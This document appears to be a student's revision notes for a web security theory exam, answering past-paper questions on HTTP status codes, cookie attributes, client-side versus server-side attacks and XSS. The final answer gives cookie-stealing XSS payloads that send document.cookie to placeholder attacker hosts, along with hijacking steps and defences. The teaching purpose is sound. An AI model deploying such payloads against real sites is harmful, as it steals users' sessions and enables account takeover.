# Web Application Security Theory

Notes for our upcoming theory exam - here, I have centralized all the past paper and mock questions we have been given, to be studied. Each topic is under a H2 Header.<br>
Under each question, there is a **Answer** and **Bullets** dropdown. The Bullets dropdown is essentially the answer but condensed.

## Past Paper 1

### 1. As web server responses are received by the web browser, they will include a status code to signal what type of response it is. HTTP response codes are grouped into five families that provide similar type of status codes. Provide the **numeric code grouping** of these families with a short description of what they represent.

<details>
  <summary>Answer</summary>
  
  HTTP response status codes are grouped into five categories based on their first digit:
  
  1. **1xx (Informational)**: These status codes indicate that the request was received and understood. They are provisional responses, informing the client that the server has received the request and is processing it. Examples include 100 (Continue) and 101 (Switching Protocols).
  
  2. **2xx (Success)**: These status codes confirm that the client's request was successfully received, understood, and processed. The most common is 200 (OK), but others include 201 (Created), 204 (No Content), and 206 (Partial Content).
  
  3. **3xx (Redirection)**: These status codes inform the client that further action is needed to complete the request, typically involving redirection to another resource. Examples include 301 (Moved Permanently), 302 (Found), 304 (Not Modified), and 307 (Temporary Redirect).
  
  4. **4xx (Client Error)**: These status codes indicate that the client has made an error in their request. Common examples include 400 (Bad Request), 401 (Unauthorized), 403 (Forbidden), 404 (Not Found), and 429 (Too Many Requests).
  
  5. **5xx (Server Error)**: These status codes signal that the server failed to fulfill a valid request due to an error on the server side. Examples include 500 (Internal Server Error), 502 (Bad Gateway), 503 (Service Unavailable), and 504 (Gateway Timeout).
  
  Understanding these status code families is essential for diagnosing issues in web applications and implementing proper error handling.
</details>

<details>
  <summary>Bullets</summary>
  
  * **1xx (Informational)** - Request received, continuing process
  * **2xx (Success)** - Request successfully received, understood, accepted
  * **3xx (Redirection)** - Further action needed to complete request
  * **4xx (Client Error)** - Request contains errors or cannot be fulfilled
  * **5xx (Server Error)** - Server failed to fulfill valid request
</details>

### 2. **Cookies** are a key part of the HTTP protocol that most web applications rely on. Describe in detail the application and function of cookies in web applications.

<details>
  <summary>Answer</summary>
  
  Cookies are small pieces of data stored on the client's device by the web browser when visiting websites. They function as a state management mechanism for the otherwise stateless HTTP protocol. When a server sends a response to a client, it can include a Set-Cookie header, instructing the browser to store this cookie. On subsequent requests to the same domain, the browser automatically sends back all relevant cookies in the Cookie header.
  
  The primary applications and functions of cookies include:
  
  **Session Management**: Cookies enable servers to recognize users across multiple requests, maintaining session state. Without cookies, users would need to authenticate with every request. Session cookies store session identifiers that link to session data stored on the server.
  
  **Personalization**: Cookies allow websites to remember user preferences, settings, and customizations. This improves user experience by maintaining personalized interfaces or content between visits.
  
  **Tracking and Analytics**: Cookies help website owners gather insights about user behavior, navigation patterns, and site usage. This information is valuable for improving website design and functionality.
  
  **Authentication**: Cookies facilitate "remember me" functionality, allowing users to stay logged in between browser sessions without re-entering credentials.
  
  **Shopping Carts**: E-commerce sites use cookies to maintain shopping cart contents as users navigate through the site.
  
  Cookies have various lifespans: session cookies exist only until the browser is closed, while persistent cookies remain for a specified period. They also have scope limitations through the Domain and Path attributes, restricting where cookies are sent. Modern web security practices include additional protections like the Secure flag (HTTPS only) and HttpOnly flag (inaccessible to JavaScript) to mitigate various attacks.
</details>

<details>
  <summary>Bullets</summary>
  
  * **State management** for stateless HTTP protocol
  * **Session tracking** - maintains user identity across requests
  * **Authentication** - remembers login state
  * **Personalization** - stores user preferences
  * **Shopping carts** - remembers selected items
  * **Analytics** - tracks user behavior and patterns
  * **Created via** Set-Cookie header, sent via Cookie header
  * **Two types**: session cookies (temporary) and persistent cookies (with expiration)
</details>

### 3. In addition to the cookie's actual value, the **Set-Cookie** header can include optional attributes, which can be used to control how the browser handles the cookie. List and explain the purpose each of these optional attributes.

<details>
  <summary>Answer</summary>
  
  The Set-Cookie header supports several optional attributes that control cookie behavior:
  
  **Expires/Max-Age**: Determines the cookie's lifespan. Expires specifies an exact date/time when the cookie should expire, while Max-Age indicates the number of seconds until expiration. Without either attribute, the cookie becomes a session cookie that is deleted when the browser closes.
  
  **Domain**: Specifies which domains can receive the cookie. If omitted, the cookie applies only to the originating domain (excluding subdomains). When specified, the cookie is sent to the specified domain and all its subdomains.
  
  **Path**: Restricts the cookie to specific paths within the domain. If set to "/admin", the cookie is only sent for requests to paths starting with "/admin". The default is "/", which applies to the entire domain.
  
  **Secure**: When present, this flag ensures the cookie is only transmitted over secure (HTTPS) connections, protecting it from interception over insecure channels.
  
  **HttpOnly**: Prevents client-side scripts (JavaScript) from accessing the cookie, mitigating the risk of cross-site scripting (XSS) attacks that attempt to steal cookies.
  
  **SameSite**: Controls whether cookies are sent with cross-site requests, helping protect against cross-site request forgery (CSRF) attacks. Three possible values: Strict (cookies sent only to same site), Lax (cookies sent with GET requests and navigation to the origin site), and None (cookies sent in all contexts, requires Secure attribute).
  
  **Priority** (Chrome only): Suggests relative importance of the cookie (Low, Medium, High) when the browser needs to evict cookies due to storage limits.
  
  **Partitioned** (emerging standard): Creates "partitioned" cookies that are tied to the top-level site being visited, enhancing privacy by preventing cross-site tracking.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Expires/Max-Age** - sets cookie lifetime
  * **Domain** - controls which domains receive cookie
  * **Path** - limits cookie to specific URL paths
  * **Secure** - restricts to HTTPS connections only
  * **HttpOnly** - prevents JavaScript access
  * **SameSite** - controls cross-site sending (Strict/Lax/None)
  * **Priority** - suggests importance when storage limited (Chrome)
  * **Partitioned** - isolates cookies to top-level site context
</details>

## Past Paper 2

### 1. Discuss the gradual shift in focus from **server-side** to **client-side** attacks in recent years. Your answer should include an explanation of the similarities and differences in attacks as well as reason(s) for this change.

<details>
  <summary>Answer</summary>
  
  The cybersecurity landscape has witnessed a notable shift from predominantly server-side attacks to an increased focus on client-side attacks. This evolution reflects changes in web application architecture and security practices.
  
  **Similarities**:
  Both attack vectors ultimately aim to compromise applications and their data. Both exploit vulnerabilities in code or configuration. Both can lead to data breaches, unauthorized access, and system compromise. Additionally, both attack types often leverage input validation failures and can be mitigated through proper security controls.
  
  **Differences**:
  Server-side attacks (like SQL injection and command injection) target application logic running on servers, often seeking direct database access or system-level compromise. They typically focus on back-end technologies and languages (PHP, Java, etc.).
  
  Client-side attacks (like XSS, CSRF, and DOM-based vulnerabilities) execute in the user's browser, targeting front-end code. They often aim to steal sensitive information from users, hijack sessions, or manipulate the user interface. These attacks are more user-focused and occur in the victim's browser context.
  
  **Reasons for the shift**:
  
  1. **Improved server-side security**: Organizations have implemented better server-side security practices, including parameterized queries, WAFs, and code analysis tools, making these attacks more difficult.
  
  2. **Rise of modern web applications**: Modern applications rely heavily on JavaScript frameworks (React, Angular, Vue) that process more logic client-side, expanding the attack surface in browsers.
  
  3. **API-driven architecture**: The shift to microservices and API-based architectures places more functionality in client-side code that consumes these APIs.
  
  4. **Rich user interfaces**: Today's web applications have complex front-ends with extensive client-side processing, creating more potential vulnerabilities.
  
  5. **Browser as a platform**: The browser has evolved into an application platform with powerful capabilities that attackers can abuse when compromised.
  
  This shift requires security professionals to expand their focus to include client-side security controls alongside traditional server-side protections.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Similarities**
    * Both target code vulnerabilities
    * Both seek unauthorized data/function access
    * Both exploit input validation flaws
  
  * **Differences**
    * Server-side: targets back-end, direct DB access
    * Client-side: executes in browser, targets users
    * Different attack techniques and payloads
  
  * **Reasons for shift**
    * Better server-side security implementation
    * JavaScript framework proliferation
    * API-driven architectures
    * Richer client-side functionality
    * Browser as application platform
    * Single-page application growth
</details>

### 2. Explain the difference between a **reflected** and a **stored cross-site scripting** attack. The answer should outline each type of attack.

<details>
  <summary>Answer</summary>
  
  Cross-site scripting (XSS) attacks involve injecting malicious scripts into web pages viewed by other users. The two primary types—reflected and stored XSS—differ in how the malicious payload is delivered and persisted.
  
  **Reflected XSS**:
  
  In a reflected XSS attack, the malicious script is embedded in a request (typically in URL parameters) and "reflected" back in the server's immediate response. This attack is non-persistent, meaning the payload isn't stored on the server and must be delivered to victims through external means.
  
  The attack flow typically involves:
  1. The attacker crafts a URL containing malicious JavaScript code
  2. The victim is tricked into clicking the link (via email, social media, etc.)
  3. The victim's browser sends the request containing the payload to the vulnerable website
  4. The server includes the unvalidated, unescaped input in its response
  5. The victim's browser executes the script in the context of the vulnerable site
  
  Since reflected XSS requires victim interaction with the crafted URL, it often involves social engineering. The impact is limited to users who click the malicious link.
  
  **Stored XSS**:
  
  In stored (or persistent) XSS attacks, the malicious script is submitted to and permanently stored on the target server, usually in a database. The payload is then served to victims whenever they access the affected page.
  
  The attack flow typically involves:
  1. The attacker submits malicious script through a form that stores data (comments, user profiles, etc.)
  2. The server stores the malicious payload in its database
  3. When any user views the page containing the stored payload, their browser executes the script
  
  Stored XSS is generally more dangerous because:
  - It affects all users who view the compromised content
  - It doesn't require social engineering to deliver the payload
  - It persists until administratively removed from the server
  - It may affect users with elevated privileges who access the affected area
  
  Both types require proper input validation, output encoding, and Content Security Policy implementation as defenses.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Reflected XSS**
    * Non-persistent, payload in request, reflected in response
    * Delivered via crafted URLs (email, messages)
    * Requires victim to click malicious link
    * One-time execution per victim interaction
    * Typically exploits input parameter handling
  
  * **Stored XSS**
    * Persistent, payload stored on server (database)
    * Delivered automatically when affected page loaded
    * No user interaction needed beyond visiting page
    * Affects all users accessing infected content
    * Typically exploits content storage features
</details>

### 3. How can a hacker exploit a **XSS vulnerability** to steal session cookies? Provide a suitable payload and explain, step-by-step, how a hacker obtains the cookie of the victim. You may use a diagram to illustrate the steps involved.

<details>
  <summary>Answer</summary>
  
  A cross-site scripting (XSS) vulnerability can be leveraged to steal session cookies when those cookies aren't properly protected. Here's how the attack works:
  
  **Suitable Payload Example**:
  ```javascript
  <script>
  fetch('https://attacker-server.com/steal?cookie='+document.cookie);
  </script>
  ```
  
  Alternative payload using image:
  ```javascript
  <script>
  var img = new Image();
  img.src = 'https://attacker-server.com/steal?cookie='+encodeURIComponent(document.cookie);
  </script>
  ```
  
  **Step-by-Step Process**:
  
  1. **Vulnerability Identification**: The attacker identifies a website vulnerable to XSS, where user input is rendered without proper sanitization.
  
  2. **Payload Injection**: The attacker injects the malicious script into the vulnerable point. This could be through:
     - A comment section (stored XSS)
     - A search field (reflected XSS)
     - A URL parameter (reflected XSS)
  
  3. **Preparation of Collection Server**: The attacker sets up a server (attacker-server.com in the example) configured to receive and log incoming requests, particularly focusing on the query parameters.
  
  4. **Victim Interaction**: 
     - For stored XSS: The victim simply visits the compromised page where the script is stored
     - For reflected XSS: The victim must be tricked into clicking a malicious link
  
  5. **Script Execution**: When the victim loads the page containing the malicious script, their browser executes the JavaScript in the context of the vulnerable website.
  
  6. **Cookie Exfiltration**: The script accesses the document.cookie property (which contains cookies accessible to JavaScript) and sends this data to the attacker's server.
  
  7. **Cookie Collection**: The attacker's server receives and logs the victim's cookies.
  
  8. **Session Hijacking**: The attacker can now use these stolen cookies to impersonate the victim by inserting them into their own browser, effectively hijacking the victim's session.
  
  This attack is particularly effective against sessions that rely solely on cookies for authentication without additional security controls. It can be prevented by using the HttpOnly flag on cookies containing sensitive information, which makes them inaccessible to JavaScript.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Attack Payload**:
    * `<script>fetch('https://attacker.com/steal?c='+document.cookie);</script>`
  
  * **Attack Flow**:
    * Attacker finds XSS vulnerability
    * Attacker sets up collection server
    * Attacker injects cookie-stealing script
    * Victim loads compromised page
    * Script executes in victim's browser context
    * Cookie sent to attacker's server
    * Attacker uses cookie to hijack session
  
  * **Prevention**:
    * HttpOnly flag on sensitive cookies
    * Content-Security-Policy implementation
    * Input validation and output encoding
    * XSS auditing and sanitization
</details>
